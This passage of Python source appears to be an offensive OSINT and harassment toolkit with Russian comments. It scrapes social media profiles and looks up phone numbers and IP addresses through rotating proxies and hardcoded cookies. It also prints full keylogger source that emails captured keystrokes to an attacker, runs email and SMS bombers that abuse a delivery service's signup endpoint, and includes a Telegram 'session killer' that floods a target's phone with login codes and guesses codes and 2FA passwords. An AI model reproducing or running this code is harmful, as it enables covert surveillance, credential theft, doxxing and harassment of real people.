        response = requests.get(url, headers=headers, proxies=proxy_dict, timeout=10)
        
        if response.status_code != 200:
            print(f"{Fore.RED}Error: Profile not found (code {response.status_code})")
            return
        
        soup = BeautifulSoup(response.text, 'lxml')
        
        # Имя пользователя
        name_elem = soup.find('span', class_='p-name')
        if name_elem:
            print(f"NAME: {Fore.GREEN}{name_elem.text.strip()}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Name not specified")
        
        # Никнейм
        nick_elem = soup.find('span', class_='p-nickname')
        if nick_elem:
            print(f"Nickname: {Fore.CYAN}{nick_elem.text.strip()}{Style.RESET_ALL}")
        
        # Биография
        bio_elem = soup.find('div', class_='p-note')
        if bio_elem:
            print(f"Bio: {Fore.YELLOW}{bio_elem.text.strip()}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Bio not available")
        
        # Статистика
        contribs = soup.find('h2', class_='f4 text-normal mb-2')
        if contribs:
            print(f"\n{Fore.MAGENTA}Contributions:")
            print(f"{Fore.CYAN}{contribs.text.strip().split('contributions')[0]}contributions{Style.RESET_ALL}")
        
        # Репозитории
        repos = soup.find_all('li', class_='public')
        if repos:
            print(f"\n{Fore.MAGENTA}Public repositories: {Fore.CYAN}{len(repos)}{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}Top repositories:")
            for repo in repos[:3]:
                name = repo.find('a', itemprop='name codeRepository')
                if name:
                    print(f"- {Fore.BLUE}{name.text.strip()}{Style.RESET_ALL}")
            
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")

# TWITTER

def search_x(username, proxy_dict=None):
    print_service_header("X.COM")
    proxy_dict = get_random_proxy()
    url = f"https://x.com/{username}"
    try:
        # Увеличиваем таймаут и добавляем User-Agent
        custom_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        
        response = requests.get(
            url, 
            headers={**headers, **custom_headers},
            proxies=proxy_dict, 
            timeout=5  # Увеличенный таймаут
        )
        
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'lxml')
            
            # Пытаемся найти имя пользователя
            name_element = soup.find('div', {'data-testid': 'UserName'})
            name = name_element.text.strip() if name_element else "N/A"
            
            # Пытаемся найти био
            bio_element = soup.find('div', {'data-testid': 'UserDescription'})
            bio = bio_element.text.strip() if bio_element else "No bio"
            
            # Пытаемся найти количество подписчиков
            followers_element = soup.find('a', href=f'/{username}/followers')
            followers = followers_element.find('span').text if followers_element else "N/A"
            
            print(f"\n{Fore.GREEN}Profile found!")
            print(f"URL: {Fore.BLUE}{url}{Style.RESET_ALL}")
            print(f"Name: {Fore.CYAN}{name}{Style.RESET_ALL}")
            print(f"Bio: {Fore.YELLOW}{bio}{Style.RESET_ALL}")
            print(f"Followers: {Fore.MAGENTA}{followers}{Style.RESET_ALL}")
            
        elif response.status_code == 404:
            print(f"{Fore.RED}Profile not found on X.com")
        else:
            print(f"{Fore.YELLOW}Unexpected status: {response.status_code}")
            
    except requests.exceptions.ReadTimeout:
        print(f"{Fore.RED}X.com is not responding (timeout). Site might be blocked in your region.")
    except Exception as e:
        print(f"{Fore.RED}X.com Error: {str(e)}")

# FACEIT

def search_faceit(username, faceit_api_key, proxy_dict=None):
    proxy_dict = get_random_proxy()
    
    print_service_header("FACEIT")
    if not faceit_api_key:
        print(f"{Fore.YELLOW}Faceit API key not set. Skipping Faceit search.")
        return
        
    try:
        # Первый запрос: информация об игроке
        url = f"https://open.faceit.com/data/v4/players?nickname={username}"
        headers = {
            'Authorization': f'Bearer {faceit_api_key}',
            'accept': 'application/json'
        }
        
        response = requests.get(
            url,
            headers=headers,
            proxies=proxy_dict,
            timeout=15
        )
        
        if response.status_code == 200:
            data = response.json()
            player_id = data.get('player_id', 'N/A')
            
            print(f"\n{Fore.GREEN}Player found!")
            print(f"Player ID: {Fore.CYAN}{player_id}{Style.RESET_ALL}")
            print(f"Nickname: {Fore.GREEN}{data.get('nickname')}{Style.RESET_ALL}")
            print(f"Country: {Fore.CYAN}{data.get('country', 'N/A')}{Style.RESET_ALL}")
            print(f"Steam ID: {Fore.MAGENTA}{data.get('steam_id_64', 'N/A')}{Style.RESET_ALL}")
            
            # Получаем CS2 статистику
            if 'games' in data and 'cs2' in data['games']:
                cs2_data = data['games']['cs2']
                print(f"\n{Fore.MAGENTA}CS2 Statistics:")
                print(f"Skill Level: {Fore.CYAN}{cs2_data.get('skill_level', 'N/A')}{Style.RESET_ALL}")
                print(f"ELO: {Fore.CYAN}{cs2_data.get('faceit_elo', 'N/A')}{Style.RESET_ALL}")
                print(f"Region: {Fore.CYAN}{cs2_data.get('region', 'N/A')}{Style.RESET_ALL}")
                
                # Второй запрос: детальная статистика
                try:
                    stats_url = f"https://open.faceit.com/data/v4/players/{player_id}/stats/cs2"
                    stats_response = requests.get(
                        stats_url, 
                        headers=headers, 
                        proxies=proxy_dict,
                        timeout=15
                    )
                    
                    if stats_response.status_code == 200:
                        stats_data = stats_response.json()
                        lifetime = stats_data.get('lifetime', {})
                        
                        print(f"\n{Fore.MAGENTA}Lifetime Stats:")
                        print(f"Matches: {Fore.CYAN}{lifetime.get('Matches', 'N/A')}{Style.RESET_ALL}")
                        print(f"Wins: {Fore.CYAN}{lifetime.get('Wins', 'N/A')}{Style.RESET_ALL}")
                        print(f"Win Rate: {Fore.CYAN}{lifetime.get('Win Rate %', 'N/A')}%{Style.RESET_ALL}")
                        print(f"K/D Ratio: {Fore.CYAN}{lifetime.get('Average K/D Ratio', 'N/A')}{Style.RESET_ALL}")
                        print(f"Headshots: {Fore.CYAN}{lifetime.get('Average Headshots %', 'N/A')}%{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}Couldn't retrieve detailed stats (HTTP {stats_response.status_code})")
                        
                except Exception as stats_e:
                    print(f"{Fore.YELLOW}Stats API Error: {str(stats_e)}")
                
            else:
                print(f"{Fore.YELLOW}No CS2 stats available for this player")
                
        elif response.status_code == 401:
            print(f"{Fore.RED}Invalid Faceit API key")
        elif response.status_code == 404:
            print(f"{Fore.RED}Player not found on Faceit")
        else:
            print(f"{Fore.RED}Faceit API Error: HTTP {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Faceit Connection Error: {str(e)}")
    except Exception as e:
        print(f"{Fore.RED}Faceit API Error: {str(e)}")

#REDDIT

def search_reddit(username, proxy_dict=None):
    proxy_dict = get_random_proxy()
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        url = f"https://www.reddit.com/user/{username}/"
        
        # Делаем запрос с обработкой прокси
        response = requests.get(
            url, 
            headers=headers, 
            proxies=proxy_dict,
            timeout=10
        )

        print_service_header("REDDIT")
        
        if response.status_code == 404:
            print(f"{Fore.RED}User not found{Style.RESET_ALL}")
            return
        elif response.status_code != 200:
            print(f"{Fore.RED}Error: HTTP {response.status_code}{Style.RESET_ALL}")
            return

        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Проверка на бан/удаление аккаунта
        banned = soup.find('div', {'class': '_2noXsJzh1b4BEDiEw2QEEy'})
        if banned and "This account has been banned" in banned.text:
            print(f"{Fore.RED}[BANNED ACCOUNT] {url}{Style.RESET_ALL}")
            return
            
        # Проверка существования пользователя
        not_found = soup.find(string=lambda text: "nobody on Reddit goes by that name" in text if text else False)
        if not_found:
            print(f"{Fore.RED}User not found{Style.RESET_ALL}")
            return

        # Извлечение основной информации
        print(f"{Fore.GREEN}Profile found: {url}{Style.RESET_ALL}")
        
        # Имя пользователя (более надежный способ)
        profile_name = soup.find('h1', class_='_3LM4tRaExed4x1wBfK1pmg')
        if profile_name:
            print(f"{Fore.CYAN}Name: {profile_name.text.strip()}{Style.RESET_ALL}")
        
        # Карма и дата создания
        karma_element = soup.select_one('span#profile--id-card--highlight-tooltip--karma')
        created_element = soup.select_one('span#profile--id-card--highlight-tooltip--cakeday')
        
        if karma_element:
            print(f"{Fore.YELLOW}Karma: {karma_element.text.strip()}{Style.RESET_ALL}")
        if created_element:
            print(f"{Fore.YELLOW}Created: {created_element.text.strip()}{Style.RESET_ALL}")
            
        # Описание профиля
        bio = soup.select_one('div._3xX726aBn29LDbsDtzr_6E._1Ap4F5maDtT1E1YuCiaO0r.D3IL3FD0RFy_mkKLPwL4')
        if bio:
            print(f"{Fore.MAGENTA}Bio: {bio.text.strip()}{Style.RESET_ALL}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Reddit request failed: {str(e)}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Reddit search error: {str(e)}{Style.RESET_ALL}")

# I PEEK YOU

def ipeekyou(username, proxy_dict):
    proxy_dict = get_random_proxy()


    print_service_header("I peek you")

    cookies = {
        'PHPSESSID': '54k6gnivbid1ejkvsim6ul62lg',
        '_ga_CG5QBW0WMP': 'GS2.1.s1750086295$o2$g1$t1750086307$j48$l0$h0',
        '_ga': 'GA1.1.1299612171.1750080837',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Referer': 'https://www.peekyou.com/username',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        # 'Cookie': 'PHPSESSID=54k6gnivbid1ejkvsim6ul62lg; _ga_CG5QBW0WMP=GS2.1.s1750086295$o2$g1$t1750086307$j48$l0$h0; _ga=GA1.1.1299612171.1750080837',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    response = requests.get(f'https://www.peekyou.com/username={username}/', cookies=cookies, headers=headers, proxies=proxy_dict)
    with open('ipeekyou.html', 'w', encoding='utf-8') as file:
        file.write(response.text)

################################################################################################

#NUMBER

################################################################################################

# Numverify

def search_numverify(number, NumVerifyAPI, proxy_dict=None):
    proxy_dict = get_random_proxy()
    
    url = f"http://apilayer.net/api/validate?access_key={NumVerifyAPI}&number={number}"

    try:
        response = requests.get(url, headers=headers, proxies=proxy_dict, timeout=10)
        data = response.json()
        print_service_header("NumVerify")

        if data.get("valid"):

            print(f"contry: {data['country_name']}")
            print(f"country prefix: {data['country_prefix']}")
            print(f"local format: {data['local_format']}")
            print(f"location: {data['location']}")
            print(f"carrier: {data['carrier']}")
            print(f"line type: {data['line_type']}")
        else:
            return

    except Exception as e:
        return
    
# phone-analysic

def phonenumbers_search(number):
    number56 = '+' + number
    numbers56 = phonenumbers.parse(number56)
    timez = timezone.time_zones_for_number(numbers56)
    carrier56 = carrier.name_for_number(numbers56, 'ru')
    region56 = geocoder.description_for_number(numbers56, 'ru')
    valid = phonenumbers.is_valid_number(numbers56)
    possible = phonenumbers.is_possible_number(numbers56)
    print_service_header("PHONE NUMBER")
    print(numbers56)
    print(timez)
    print(carrier56)
    print(region56)
    print(f"Valid: {valid}")
    print(f"Possible: {possible}")



def truecaller_search(number, TrueCallerAPI, proxy_dict=None):
    proxy_dict = get_random_proxy()
    number_with_plus = '+' + number 
    parsed_number = phonenumbers.parse(number_with_plus, None)
    region_code = phonenumbers.region_code_for_number(parsed_number)
    national_num = phonenumbers.national_significant_number(parsed_number)
    url = f"https://api.truecaller.com/v2.5/search?phone={national_num}&countryCode={region_code}"
    headers = {
    "Authorization": f"Bearer {TrueCallerAPI}",
    "Accept": "application/json",
    'user-agent': user
    }
    try:
        print_service_header("TrueCaller")
        response = requests.get(url, headers=headers, proxies=proxy_dict)
        response.raise_for_status()
        data = response.json()

        if 'data' in data and len(data['data']) > 0:
            result = data['data'][0]
            print("Name:", result.get('name', 'N/A'))
            print("Phone:", result.get('phones', [{}])[0].get('nationalFormat', 'N/A'))
            print("Country:", result.get('addresses', [{}])[0].get('country', 'N/A'))
            print("Email:", result.get('internetAddresses', [{}])[0].get('id', 'N/A'))
            print("Company:", result.get('jobs', [{}])[0].get('company', 'N/A'))
        else:
            print("Not found")
    
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")





################################################################################################

# IP

################################################################################################


# IP-API


def ip_search(ipby56, proxy_dict=None):
    proxy_dict = get_random_proxy()
    try:
        url = f"http://ip-api.com/json/{ipby56}"

        response = requests.get(url, headers=headers, proxies=proxy_dict).json()
        data = {
            '[IP]': response.get('query'),
            '[Int prov]': response.get('isp'),
            '[Org]': response.get('org'),
            '[Country]': response.get('country'),
            '[Region]': response.get('RegionName'),
            '[City]': response.get('City'),
            '[ZIP]': response.get('zip'),
            '[Time zone]': response.get('timezone'),
            '[Lat]': response.get('lat'),
            '[Lon]': response.get('lon'),

        }
        print_service_header("IP-API")
        for k, v in data.items():
            print(f"{k} : {v}")

        area = folium.Map(location=[response.get('lat'), response.get('lon')])
        area.save(f'{response.get("query")}_{response.get("city")}.html')


    except requests.exceptions.ConnectionError:
        return
    
# I KNOW WHAT YOU DOWNOLOAD

def iknowwd(ipby56, proxy_dict):
    proxy_dict = get_random_proxy()
    url = f"https://iknowwhatyoudownload.com/en/peer/?ip={ipby56}"
    print(Fore.MAGENTA + "")
    print_service_header("IKWYD")
    print(url)
    print("This service need manual check")

#SPYS

def spys(ipby56, proxy_dict):
    proxy_dict = get_random_proxy()
    
    cookies = {
        '_ga_XWX5S73YKH': 'GS2.1.s1750083539$o3$g1$t1750084547$j20$l0$h0',
        '_ga': 'GA1.1.489356841.1750061913',
        'FCCDCF': '%5Bnull%2Cnull%2Cnull%2C%5B%22CQTGbEAQTGbEAEsACBENBvFoAP_gAEPgAAiQK1ID_C7EbCFCiDp3IKMEMAhHQBBAYsQwAAaBA4AADBIQIAQCgkEYBASAFCACCAAAKCSBAAAgCAAAAUAAYAAVAABEAAwAIBAIIAAAgAAAAEAIAAAACIAAEQCAAAAEEEAAkAgAAAIASAAAAAAAAACBAAAAAAAAAAAAAAAABAAAAQAAQAAAAAAAiAAAAAAAABAIAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAABAAAAAAAQR2QD-F2I2EKFEHCuQUYIYBCugCAAxYhgAA0CBgAAGCQgQAgFJIIkCAEAIEAAEAAAQEgCAABQABAAAIAAgAAqAACIABgAQCAQQIABAAAAgIAAAAAAEQAAIgEAAAAIIIABABAAAAQAkAAAAAAAAAECAAAAAAAAAAAAAAAAAAAAAEABgAAAAAABEAAAAAAAACAQIAAA%22%2C%222~61.89.122.184.196.230.314.318.442.445.494.550.576.609.1029.1033.1046.1051.1097.1126.1166.1301.1415.1725.1765.1942.1958.1987.2068.2072.2074.2107.2213.2219.2223.2224.2328.2331.2387.2416.2501.2567.2568.2575.2657.2686.2778.2869.2878.2908.2920.2963.3005.3023.3100.3126.3219.3234.3235.3253.3309.3731.6931.8931.13731.15731~dv.%22%2C%228E16F4C1-F8F2-443F-B87C-642B34CFD00E%22%5D%5D',
        '__gads': 'ID=0414d2838f853b20:T=1750061922:RT=1750084434:S=ALNI_MYxXTbbFl5nauVemujBk2i4ucAhGw',
        '__gpi': 'UID=0000113daa1d8b36:T=1750061922:RT=1750084434:S=ALNI_MY9KKHgVbbBxRmTcDObTmWNIJGskw',
        '__eoi': 'ID=734d96bab681bd48:T=1750061922:RT=1750084434:S=AA-AfjbUHY69bDxEbPe11bIQzCq5',
        'cf_clearance': 'NvwMgWNPWvY7G31qWux617YUimf6q4SVGLp.OOxeXiY-1750084434-1.2.1.1-Mu9RU.cizTZ6tNjwxK.97JmIVvbAwW0zfpy21PUseIYWIWicI85c2k3VScJBmg7z5pcEWNE6oAGND_ChGu4Zxk5ViNss1MQdTVP53AiGlPnnoXK2q39qGovTtWvJZjXO_aChgvucUiL5S.siBLhQYydF8w6zDNZQsFjj8epfrkwJe2z7FbeZQoX1Wzdp.5CM6OXaHj5hxuK6NjydX1o7b8Z63fboxW11i0ykbWmrqivpyWlWvIMprtTNhYMYzBtsx_sH.Jbh9aGS_BzkpILcOGQUuHJgBiuBVqDN9qfiusljICAr3fl0K.Typt2.nW4cjw8e8HtWIAyMlSFbhr4m7loYMMy3K5raFrVRdRLPVAc',
        'FCNEC': '%5B%5B%22AKsRol_uAIwi4skou9X9_QSGOwU6U3O5yH5mT9sdl_1-4g-ddIuV8uhxupUfIo93SrAgr8HJfTDJeK1PgUSlF8A2LVQA7Edxc9Me1EtvzRig4gDfIDnhV32hw8ncRHcCaClnEagj5BCUdLdB2mdxW-cs8j1l4SbBEQ%3D%3D%22%5D%5D',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Referer': 'https://spys.one/ipinfo/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://spys.one',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        # 'Cookie': '_ga_XWX5S73YKH=GS2.1.s1750083539$o3$g1$t1750084547$j20$l0$h0; _ga=GA1.1.489356841.1750061913; FCCDCF=%5Bnull%2Cnull%2Cnull%2C%5B%22CQTGbEAQTGbEAEsACBENBvFoAP_gAEPgAAiQK1ID_C7EbCFCiDp3IKMEMAhHQBBAYsQwAAaBA4AADBIQIAQCgkEYBASAFCACCAAAKCSBAAAgCAAAAUAAYAAVAABEAAwAIBAIIAAAgAAAAEAIAAAACIAAEQCAAAAEEEAAkAgAAAIASAAAAAAAAACBAAAAAAAAAAAAAAAABAAAAQAAQAAAAAAAiAAAAAAAABAIAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAABAAAAAAAQR2QD-F2I2EKFEHCuQUYIYBCugCAAxYhgAA0CBgAAGCQgQAgFJIIkCAEAIEAAEAAAQEgCAABQABAAAIAAgAAqAACIABgAQCAQQIABAAAAgIAAAAAAEQAAIgEAAAAIIIABABAAAAQAkAAAAAAAAAECAAAAAAAAAAAAAAAAAAAAAEABgAAAAAABEAAAAAAAACAQIAAA%22%2C%222~61.89.122.184.196.230.314.318.442.445.494.550.576.609.1029.1033.1046.1051.1097.1126.1166.1301.1415.1725.1765.1942.1958.1987.2068.2072.2074.2107.2213.2219.2223.2224.2328.2331.2387.2416.2501.2567.2568.2575.2657.2686.2778.2869.2878.2908.2920.2963.3005.3023.3100.3126.3219.3234.3235.3253.3309.3731.6931.8931.13731.15731~dv.%22%2C%228E16F4C1-F8F2-443F-B87C-642B34CFD00E%22%5D%5D; __gads=ID=0414d2838f853b20:T=1750061922:RT=1750084434:S=ALNI_MYxXTbbFl5nauVemujBk2i4ucAhGw; __gpi=UID=0000113daa1d8b36:T=1750061922:RT=1750084434:S=ALNI_MY9KKHgVbbBxRmTcDObTmWNIJGskw; __eoi=ID=734d96bab681bd48:T=1750061922:RT=1750084434:S=AA-AfjbUHY69bDxEbPe11bIQzCq5; cf_clearance=NvwMgWNPWvY7G31qWux617YUimf6q4SVGLp.OOxeXiY-1750084434-1.2.1.1-Mu9RU.cizTZ6tNjwxK.97JmIVvbAwW0zfpy21PUseIYWIWicI85c2k3VScJBmg7z5pcEWNE6oAGND_ChGu4Zxk5ViNss1MQdTVP53AiGlPnnoXK2q39qGovTtWvJZjXO_aChgvucUiL5S.siBLhQYydF8w6zDNZQsFjj8epfrkwJe2z7FbeZQoX1Wzdp.5CM6OXaHj5hxuK6NjydX1o7b8Z63fboxW11i0ykbWmrqivpyWlWvIMprtTNhYMYzBtsx_sH.Jbh9aGS_BzkpILcOGQUuHJgBiuBVqDN9qfiusljICAr3fl0K.Typt2.nW4cjw8e8HtWIAyMlSFbhr4m7loYMMy3K5raFrVRdRLPVAc; FCNEC=%5B%5B%22AKsRol_uAIwi4skou9X9_QSGOwU6U3O5yH5mT9sdl_1-4g-ddIuV8uhxupUfIo93SrAgr8HJfTDJeK1PgUSlF8A2LVQA7Edxc9Me1EtvzRig4gDfIDnhV32hw8ncRHcCaClnEagj5BCUdLdB2mdxW-cs8j1l4SbBEQ%3D%3D%22%5D%5D',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = f'ip={ipby56}&xip1=1^&xip2=0'

    response = requests.post('https://spys.one/ipinfo/', cookies=cookies, headers=headers, data=data, proxies=proxy_dict)
    print_service_header("Spys")
    with  open('spys.html', 'w') as file:
        file.write(response.text)

# CHECK HOST

def check_host(ipby56, proxy_dict):
    proxy_dict = get_random_proxy()

    cookies = {
        'cf_clearance': '6HfXMljw8x0YSaTX4M.Qmzg9BejGkcB.nIDqiXB145Q-1750062009-1.2.1.1-3lBzXT2STcn0mPHYrMaK7ndU_8XXzyO.MHRQJ0QVQOguxxDP42lCjWnXUYNMpuZH9T4U58Zhw4Zb2k3rUrrfsT.ShqJ3CFHmw9Z23.3QWVEWjA.3lbQFNODplm_AvYorv7FNawR.TMDqhgwlV2WdZ37w0e0tWnzU.OAe0rC.k8kBlQVn3pauAvlfyItkg8icNPNvD4gsUnl4uJfQGhYcK85fc6bl4WjY_jP8QfQlpNWqKlViphPgtY.Zue1v5meNjx_ro0AuBhDCUxGwE_APKKeqfw5w_lrBxLyRJmLFAU6eJx7gaIpM1MBEFSMHSOdVG3cBGEGQdgzj1ELX4VJfLXCMnaj3qr1Ranp_UPSB4CipnGZHRvPdSmANAZdlFRj.',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Referer': 'https://check-host.net/ip-info?host=^&csrf_token=0e633eda6e232995bddefcd1a68c74d7f128c4d4',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        # 'Cookie': 'cf_clearance=6HfXMljw8x0YSaTX4M.Qmzg9BejGkcB.nIDqiXB145Q-1750062009-1.2.1.1-3lBzXT2STcn0mPHYrMaK7ndU_8XXzyO.MHRQJ0QVQOguxxDP42lCjWnXUYNMpuZH9T4U58Zhw4Zb2k3rUrrfsT.ShqJ3CFHmw9Z23.3QWVEWjA.3lbQFNODplm_AvYorv7FNawR.TMDqhgwlV2WdZ37w0e0tWnzU.OAe0rC.k8kBlQVn3pauAvlfyItkg8icNPNvD4gsUnl4uJfQGhYcK85fc6bl4WjY_jP8QfQlpNWqKlViphPgtY.Zue1v5meNjx_ro0AuBhDCUxGwE_APKKeqfw5w_lrBxLyRJmLFAU6eJx7gaIpM1MBEFSMHSOdVG3cBGEGQdgzj1ELX4VJfLXCMnaj3qr1Ranp_UPSB4CipnGZHRvPdSmANAZdlFRj.',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    response = requests.get(
        f'https://check-host.net/ip-info?host={ipby56}&csrf_token=0e633eda6e232995bddefcd1a68c74d7f128c4d4',
        cookies=cookies,
        headers=headers,
        proxies=proxy_dict,
    )

    print_service_header("Checkhost")
    with open('checkhost.html', 'w', encoding='utf-8') as file:
        file.write(response.text)

################################################################################################

# Key-Logger

################################################################################################

def key_logger():
    getcode = '''


from pynput.keyboard import Key, Listener
import smtplib
import logging

word = ''
full_log = ''
chars_limit = 1000
while True:

    def keylogger(key):
        global word
        global full_log
        
        try:
            if key == Key.space:
                word += ' '
            elif key == Key.enter:
                word += '\n'
            elif key == Key.backspace:
                word = word[:-1]
            elif key in (Key.shift, Key.shift_l, Key.shift_r, Key.ctrl, Key.alt, Key.cmd):
                return
            else:
                # Правильное извлечение символа
                if hasattr(key, 'char'):
                    word += key.char
                else:
                    # Для специальных клавиш добавляем их название
                    word += f'[{key.name}]'
                    
            # Проверка на достижение лимита
            if len(full_log + word) >= chars_limit:
                full_log += word
                send_email()
                full_log = ''
                word = ''
                
        except Exception as e:
            logging.error(f"Key error: {e}")

    def send_email():
        sender = 'YOUR_EMAIL@gmail.com'
        receiver = 'EMAIL TO SEND@gmail.com'
        password = 'YOUR_APP_PASSWORD'
        
        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:  
                server.login(sender, password)
                subject = "Keylogger Report"
                body = f"Logged text:\n\n{full_log}"
                message = f"Subject: {subject}\n\n{body}"
                server.sendmail(sender, receiver, message)
                print("Email sent successfully!")
        except Exception as e:
            logging.error(f"Email failed: {e}")

    def main():
        with Listener(on_press=keylogger) as log:
            log.join()

    if __name__ == '__main__':
        main()






'''

    print(getcode)



################################################################################################

#BOMBERS

################################################################################################

# GMAIL BOMBER

def start_gmail_bomber(config: dict):
    """Запускает бомбер на основе конфига"""
    threads = []
    for account in config['accounts']:
        for target in config['targets']:
            thread = threading.Thread(
                target=bomber_worker,
                args=(
                    account,
                    target,
                    config['subject'],
                    config['message'],
                    config['amount_per_account']
                )
            )
            thread.start()
            threads.append(thread)
    
    for thread in threads:
        thread.join()

# SMS BOMBER

def smsbomber(phoneby56):
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept-Language': 'ru-RU,ru;q=0.9',
    })

    # 2. Получение начальной страницы для кук
    init_url = "https://eda.yandex.ru"
    response = session.get(init_url)
    
    # 3. Получение страницы регистрации
    auth_url = "https://reg.eda.yandex.ru/?advertisement_campaign=seo_eda&lang=ru&city=not_found"
    response = session.get(auth_url)
    
    # 4. Извлечение CSRF-токена (если есть в HTML)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('meta', {'name': 'csrf-token'})['content'] if soup.find('meta', {'name': 'csrf-token'}) else ''
    
    # 5. Подготовка данных для запроса
    headers = {
        'x-csrf-token': csrf_token,
        'x-requested-with': 'XMLHttpRequest',
        'Referer': auth_url,
        'Origin': 'https://reg.eda.yandex.ru',
        'Content-Type': 'application/json',
    }
    
    payload = {
        'phone': f'{phoneby56}',
        'use_passport': False
    }
    
    # 6. Отправка запроса
    response = session.post(
        'https://reg.eda.yandex.ru/api/authproxy/v1/auth/submit',
        headers=headers,
        json=payload
    )
    
    return response.json()

# TELEGRAM SESSION KILLER

async def telegram_login_worker(session_name, phone_number, attempts, delay_range, account):
    # Случайные параметры устройства
    device_model = random.choice([
        "Samsung Galaxy S23", 
        "iPhone 15 Pro", 
        "Xiaomi Redmi Note 12",
        "Google Pixel 7"
    ])
    system_version = random.choice([
        "Android 14", 
        "iOS 17.2", 
        "HarmonyOS 4.0"
    ])
    app_version = f"{random.randint(8,10)}.{random.randint(0,9)}.{random.randint(0,9)}"
    
    # Случайный прокси
    proxy_tuple = get_random_proxy_for_telethon()
    proxy = None
    if proxy_tuple:
        scheme = proxy_tuple[0].lower()
        if scheme == 'socks5':
            proxy_type = socks.SOCKS5
        elif scheme == 'socks4':
            proxy_type = socks.SOCKS4
        elif scheme in ['http', 'https']:
            proxy_type = socks.HTTP
        else:
            proxy_type = socks.SOCKS5
            
        proxy = (proxy_type, proxy_tuple[1], proxy_tuple[2])
    
    # Настройка клиента
    client = TelegramClient(
        f"sessions/{session_name}",
        account["api_id"],
        account["api_hash"],
        device_model=device_model,
        system_version=system_version,
        app_version=app_version,
        proxy=proxy
    )
    
    try:
        await client.connect()
        if not client.is_connected():
            print(f"{Fore.RED}[{session_name}] Connection failed!{Style.RESET_ALL}")
            return
        
        # Проверка прокси
        if proxy and client._session:
            try:
                test_url = "https://api.myip.com"
                async with client._session.get(test_url) as response:
                    ip_data = await response.json()
                    print(f"{Fore.CYAN}[{session_name}] Proxy IP: {ip_data['ip']} | Country: {ip_data['country']}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[{session_name}] Proxy test failed: {e}{Style.RESET_ALL}")
        
        if not await client.is_user_authorized():
            for i in range(attempts):
                try:
                    # Принудительная отправка SMS
                    sent = await client.send_code_request(phone_number, force_sms=True)
                    print(f"{Fore.CYAN}[{session_name}] Code sent to {phone_number} (via {sent.type}) | Acc: {account['name']}{Style.RESET_ALL}")
                    
                    # Генерация случайного кода
                    code = ''.join(random.choices('0123456789', k=5))
                    print(f"{Fore.MAGENTA}[{session_name}] Used code: {code}{Style.RESET_ALL}")
                    
                    try:
                        await client.sign_in(phone_number, code)
                        print(f"{Fore.GREEN}[{session_name}] Success!{Style.RESET_ALL}")
                        break
                    except PhoneCodeInvalidError:
                        print(f"{Fore.RED}[{session_name}] Invalid code, continue attack...{Style.RESET_ALL}")
                    except SessionPasswordNeededError:
                        # Генерация случайного пароля
                        password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
                        await client.sign_in(password=password)
                        print(f"{Fore.RED}[{session_name}] Sent 2FA password: {password}{Style.RESET_ALL}")
                except FloodWaitError as fwe:
